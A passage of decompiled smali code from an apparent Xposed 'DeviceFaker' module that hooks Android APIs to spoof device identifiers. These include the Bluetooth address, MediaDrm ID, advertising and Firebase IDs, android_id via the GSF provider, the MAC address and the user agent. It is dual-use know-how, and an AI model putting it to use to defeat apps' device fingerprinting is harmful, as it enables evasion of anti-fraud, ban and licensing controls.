    .local v0, "btClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const-string v4, "getAddress"

    new-instance v7, Lcom/rebel/module/XposedHook$34;

    invoke-direct {v7, v1, v3}, Lcom/rebel/module/XposedHook$34;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v0, v4, v7}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 2015
    const-string v4, "getName"

    new-instance v7, Lcom/rebel/module/XposedHook$35;

    invoke-direct {v7, v1, v3}, Lcom/rebel/module/XposedHook$35;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v0, v4, v7}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 2022
    const-string v4, "DeviceFaker: \u2713 Hooked BluetoothAdapter"

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_c

    .line 2025
    .end local v0    # "btClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    goto :goto_f

    .line 2023
    :catchall_c
    move-exception v0

    .line 2024
    .local v0, "t":Ljava/lang/Throwable;
    :try_start_17
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "DeviceFaker: \u2717 BluetoothAdapter hooks failed: "

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_17
    .catchall {:try_start_17 .. :try_end_17} :catchall_20

    .line 2029
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_f
    :try_start_18
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 2030
    invoke-static {v13, v0}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    new-instance v4, Lcom/rebel/module/XposedHook$36;

    invoke-direct {v4, v1, v3}, Lcom/rebel/module/XposedHook$36;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    .line 2029
    invoke-static {v0, v8, v4}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 2045
    const-string v0, "DeviceFaker: \u2713 Hooked MediaDrm"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_18
    .catchall {:try_start_18 .. :try_end_18} :catchall_d

    .line 2048
    goto :goto_10

    .line 2046
    :catchall_d
    move-exception v0

    .line 2047
    .restart local v0    # "t":Ljava/lang/Throwable;
    :try_start_19
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_19
    .catchall {:try_start_19 .. :try_end_19} :catchall_20

    .line 2052
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_10
    :try_start_1a
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 2053
    invoke-static {v5, v0}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    const-string v4, "getUserAgentString"

    new-instance v7, Lcom/rebel/module/XposedHook$37;

    invoke-direct {v7, v1, v3}, Lcom/rebel/module/XposedHook$37;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    .line 2052
    invoke-static {v0, v4, v7}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    .line 2061
    const-string v0, "DeviceFaker: \u2713 Hooked WebSettings.getUserAgentString"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_1a
    .catchall {:try_start_1a .. :try_end_1a} :catchall_e

    .line 2064
    goto :goto_11

    .line 2062
    :catchall_e
    move-exception v0

    .line 2068
    :goto_11
    :try_start_1b
    const-string v0, "com.google.android.gms.ads.identifier.AdvertisingIdClient$Info"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    new-instance v7, Lcom/rebel/module/XposedHook$38;

    invoke-direct {v7, v1, v3}, Lcom/rebel/module/XposedHook$38;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v7}, [Ljava/lang/Object;

    move-result-object v7
    :try_end_1b
    .catchall {:try_start_1b .. :try_end_1b} :catchall_10

    move-object/from16 v9, v20

    :try_start_1c
    invoke-static {v0, v4, v9, v7}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2077
    const-string v0, "DeviceFaker: \u2713 Hooked AdvertisingIdClient.Info.getId"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_1c
    .catchall {:try_start_1c .. :try_end_1c} :catchall_f

    .line 2080
    goto :goto_12

    .line 2078
    :catchall_f
    move-exception v0

    goto :goto_12

    :catchall_10
    move-exception v0

    move-object/from16 v9, v20

    .line 2084
    :goto_12
    :try_start_1d
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v4, Landroid/net/Uri;

    const-class v7, Ljava/lang/String;

    const-class v10, Ljava/lang/String;

    const-class v11, Landroid/os/Bundle;

    new-instance v12, Lcom/rebel/module/XposedHook$39;

    invoke-direct {v12, v1, v3}, Lcom/rebel/module/XposedHook$39;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v4, v7, v10, v11, v12}, [Ljava/lang/Object;

    move-result-object v4
    :try_end_1d
    .catchall {:try_start_1d .. :try_end_1d} :catchall_12

    move-object/from16 v15, v18

    move-object/from16 v7, v21

    :try_start_1e
    invoke-static {v7, v0, v15, v4}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2108
    const-string v0, "DeviceFaker: \u2713 Hooked ContentResolver.call (android_id provider)"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_1e
    .catchall {:try_start_1e .. :try_end_1e} :catchall_11

    .line 2111
    goto :goto_14

    .line 2109
    :catchall_11
    move-exception v0

    goto :goto_13

    :catchall_12
    move-exception v0

    move-object/from16 v15, v18

    move-object/from16 v7, v21

    .line 2110
    .restart local v0    # "t":Ljava/lang/Throwable;
    :goto_13
    :try_start_1f
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "DeviceFaker: \u2717 ContentResolver.call hook failed: "

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_1f
    .catchall {:try_start_1f .. :try_end_1f} :catchall_20

    .line 2127
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_14
    :try_start_20
    const-string v0, "android.app.SharedPreferencesImpl"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v10, Ljava/lang/String;

    const-class v11, Ljava/lang/String;

    new-instance v12, Lcom/rebel/module/XposedHook$40;

    invoke-direct {v12, v1, v3}, Lcom/rebel/module/XposedHook$40;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v10, v11, v12}, [Ljava/lang/Object;

    move-result-object v10
    :try_end_20
    .catchall {:try_start_20 .. :try_end_20} :catchall_14

    move-object/from16 v11, v19

    :try_start_21
    invoke-static {v0, v4, v11, v10}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2171
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked SharedPreferences.getString"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_21
    .catchall {:try_start_21 .. :try_end_21} :catchall_13

    .line 2174
    goto :goto_16

    .line 2172
    :catchall_13
    move-exception v0

    goto :goto_15

    :catchall_14
    move-exception v0

    move-object/from16 v11, v19

    .line 2173
    .restart local v0    # "t":Ljava/lang/Throwable;
    :goto_15
    :try_start_22
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "DeviceFaker: \u2717 SharedPreferences hook failed: "

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_22
    .catchall {:try_start_22 .. :try_end_22} :catchall_20

    .line 2178
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_16
    :try_start_23
    const-string v0, "java.net.NetworkInterface"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v10, "getHardwareAddress"

    new-instance v12, Lcom/rebel/module/XposedHook$41;

    invoke-direct {v12, v1, v3}, Lcom/rebel/module/XposedHook$41;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v12}, [Ljava/lang/Object;

    move-result-object v12

    invoke-static {v0, v4, v10, v12}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2197
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked NetworkInterface.getHardwareAddress"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_23
    .catchall {:try_start_23 .. :try_end_23} :catchall_15

    .line 2200
    goto :goto_17

    .line 2198
    :catchall_15
    move-exception v0

    .line 2204
    :goto_17
    :try_start_24
    const-string v0, "android.provider.Settings$Global"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v10, Landroid/content/ContentResolver;

    const-class v12, Ljava/lang/String;

    new-instance v14, Lcom/rebel/module/XposedHook$42;

    invoke-direct {v14, v1, v3}, Lcom/rebel/module/XposedHook$42;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v10, v12, v14}, [Ljava/lang/Object;

    move-result-object v10

    invoke-static {v0, v4, v11, v10}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2216
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked Settings.Global.getString"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_24
    .catchall {:try_start_24 .. :try_end_24} :catchall_16

    .line 2218
    goto :goto_18

    .line 2217
    :catchall_16
    move-exception v0

    .line 2222
    :goto_18
    :try_start_25
    const-string v0, "com.google.firebase.iid.FirebaseInstanceId"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    new-instance v10, Lcom/rebel/module/XposedHook$43;

    invoke-direct {v10, v1, v3}, Lcom/rebel/module/XposedHook$43;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v10}, [Ljava/lang/Object;

    move-result-object v10

    invoke-static {v0, v4, v9, v10}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2234
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked FirebaseInstanceId.getId"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_25
    .catchall {:try_start_25 .. :try_end_25} :catchall_17

    .line 2236
    goto :goto_19

    .line 2235
    :catchall_17
    move-exception v0

    .line 2240
    :goto_19
    :try_start_26
    const-string v0, "android.opengl.GLES10"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v9, "glGetString"

    sget-object v10, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    new-instance v11, Lcom/rebel/module/XposedHook$44;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$44;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v10, v11}, [Ljava/lang/Object;

    move-result-object v10

    invoke-static {v0, v4, v9, v10}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2254
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked GLES10.glGetString"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_26
    .catchall {:try_start_26 .. :try_end_26} :catchall_18

    .line 2256
    goto :goto_1a

    .line 2255
    :catchall_18
    move-exception v0

    .line 2262
    :goto_1a
    :try_start_27
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v4, Landroid/net/Uri;

    const-class v9, Ljava/lang/String;

    const-class v10, Ljava/lang/String;

    const-class v11, Landroid/os/Bundle;

    new-instance v12, Lcom/rebel/module/XposedHook$45;

    invoke-direct {v12, v1, v3}, Lcom/rebel/module/XposedHook$45;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v4, v9, v10, v11, v12}, [Ljava/lang/Object;

    move-result-object v4

    invoke-static {v7, v0, v15, v4}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2300
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked ContentResolver.call (all settings)"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_27
    .catchall {:try_start_27 .. :try_end_27} :catchall_19

    .line 2303
    goto :goto_1b

    .line 2301
    :catchall_19
    move-exception v0

    .line 2302
    .restart local v0    # "t":Ljava/lang/Throwable;
    :try_start_28
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "DeviceFaker: \u2717 ContentResolver.call deep hook failed: "

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_28
    .catchall {:try_start_28 .. :try_end_28} :catchall_20

    .line 2307
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_1b
    :try_start_29
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v4, "getDefaultUserAgent"

    const-class v9, Landroid/content/Context;

    new-instance v10, Lcom/rebel/module/XposedHook$46;

    invoke-direct {v10, v1, v3}, Lcom/rebel/module/XposedHook$46;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v9, v10}, [Ljava/lang/Object;

    move-result-object v9

    invoke-static {v5, v0, v4, v9}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2317
    const-string v0, "DeviceFaker: \u2713 DEEP: Hooked WebSettings.getDefaultUserAgent"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_29
    .catchall {:try_start_29 .. :try_end_29} :catchall_1a

    .line 2319
    goto :goto_1c

    .line 2318
    :catchall_1a
    move-exception v0

    .line 2334
    :goto_1c
    :try_start_2a
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    invoke-static {v7, v0}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    move-object v4, v0

    .line 2338
    .local v4, "crClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const-class v18, Landroid/net/Uri;

    const-class v19, [Ljava/lang/String;

    const-class v20, Ljava/lang/String;

    const-class v21, [Ljava/lang/String;

    const-class v22, Ljava/lang/String;

    new-instance v0, Lcom/rebel/module/XposedHook$47;

    invoke-direct {v0, v1, v3}, Lcom/rebel/module/XposedHook$47;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    move-object/from16 v23, v0

    filled-new-array/range {v18 .. v23}, [Ljava/lang/Object;

    move-result-object v0

    move-object/from16 v5, v17

    invoke-static {v4, v5, v0}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/Class;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;
    :try_end_2a
    .catchall {:try_start_2a .. :try_end_2a} :catchall_1d

    .line 2349
    :try_start_2b
    const-class v17, Landroid/net/Uri;

    const-class v18, [Ljava/lang/String;

    const-class v19, Ljava/lang/String;

    const-class v20, [Ljava/lang/String;

    const-class v21, Ljava/lang/String;

    const-class v22, Landroid/os/CancellationSignal;

    new-instance v0, Lcom/rebel/module/XposedHook$48;

    invoke-direct {v0, v1, v3}, Lcom/rebel/module/XposedHook$48;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    move-object/from16 v23, v0

    filled-new-array/range {v17 .. v23}, [Ljava/lang/Object;

    move-result-object v0

    invoke-static {v4, v5, v0}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/Class;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;
    :try_end_2b
    .catchall {:try_start_2b .. :try_end_2b} :catchall_1b

    .line 2359
    goto :goto_1d

    .line 2358
    :catchall_1b
    move-exception v0

    .line 2363
    :goto_1d
    :try_start_2c
    const-class v0, Landroid/net/Uri;

    const-class v7, [Ljava/lang/String;

    const-class v9, Landroid/os/Bundle;

    const-class v10, Landroid/os/CancellationSignal;

    new-instance v11, Lcom/rebel/module/XposedHook$49;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$49;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v0, v7, v9, v10, v11}, [Ljava/lang/Object;

    move-result-object v0

    invoke-static {v4, v5, v0}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/Class;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;
    :try_end_2c
    .catchall {:try_start_2c .. :try_end_2c} :catchall_1c

    .line 2373
    goto :goto_1e

    .line 2372
    :catchall_1c
    move-exception v0

    .line 2375
    :goto_1e
    :try_start_2d
    const-string v0, "DeviceFaker: \u2713 CRITICAL: Hooked GSF ContentResolver.query (android_id via GSF)"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_2d
    .catchall {:try_start_2d .. :try_end_2d} :catchall_1d

    .line 2378
    .end local v4    # "crClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    goto :goto_1f

    .line 2376
    :catchall_1d
    move-exception v0

    .line 2377
    .restart local v0    # "t":Ljava/lang/Throwable;
    :try_start_2e
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "DeviceFaker: \u2717 GSF query hook failed: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_2e
    .catchall {:try_start_2e .. :try_end_2e} :catchall_20

    .line 2383
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_1f
    :try_start_2f
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v4, Ljava/lang/String;

    new-instance v5, Lcom/rebel/module/XposedHook$50;

    invoke-direct {v5, v1, v3}, Lcom/rebel/module/XposedHook$50;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v4, v5}, [Ljava/lang/Object;

    move-result-object v4

    invoke-static {v13, v0, v8, v4}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2407
    const-string v0, "DeviceFaker: \u2713 CRITICAL: Hooked MediaDrm.getPropertyByteArray"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_2f
    .catchall {:try_start_2f .. :try_end_2f} :catchall_1e

    .line 2410
    goto :goto_20

    .line 2408
    :catchall_1e
    move-exception v0

    .line 2409
    .restart local v0    # "t":Ljava/lang/Throwable;
    :try_start_30
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_30
    .catchall {:try_start_30 .. :try_end_30} :catchall_20

    .line 2414
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_20
    :try_start_31
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v4, "getPropertyString"

    const-class v5, Ljava/lang/String;

    new-instance v6, Lcom/rebel/module/XposedHook$51;

    invoke-direct {v6, v1, v3}, Lcom/rebel/module/XposedHook$51;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v5, v6}, [Ljava/lang/Object;

    move-result-object v5

    invoke-static {v13, v0, v4, v5}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 2428
    const-string v0, "DeviceFaker: \u2713 CRITICAL: Hooked MediaDrm.getPropertyString"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_31
    .catchall {:try_start_31 .. :try_end_31} :catchall_1f

    .line 2430
    goto :goto_21

    .line 2429
    :catchall_1f
    move-exception v0

    .line 2437
    :goto_21
    :try_start_32
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "DeviceFaker: \u2550\u2550\u2550 All DEEP hooks installed for "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, " \u2550\u2550\u2550"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_32
    .catchall {:try_start_32 .. :try_end_32} :catchall_20

    .line 2442
    .end local v3    # "profile":Lcom/rebel/module/DeviceFakerManager$DeviceProfile;
    .end local v16    # "fakerFile":Ljava/io/File;
    goto :goto_22

    .line 2439
    :catchall_20
    move-exception v0

    .line 2440
    .restart local v0    # "t":Ljava/lang/Throwable;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "DeviceFaker: \u2717 FATAL: hookDeviceFaker failed for "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

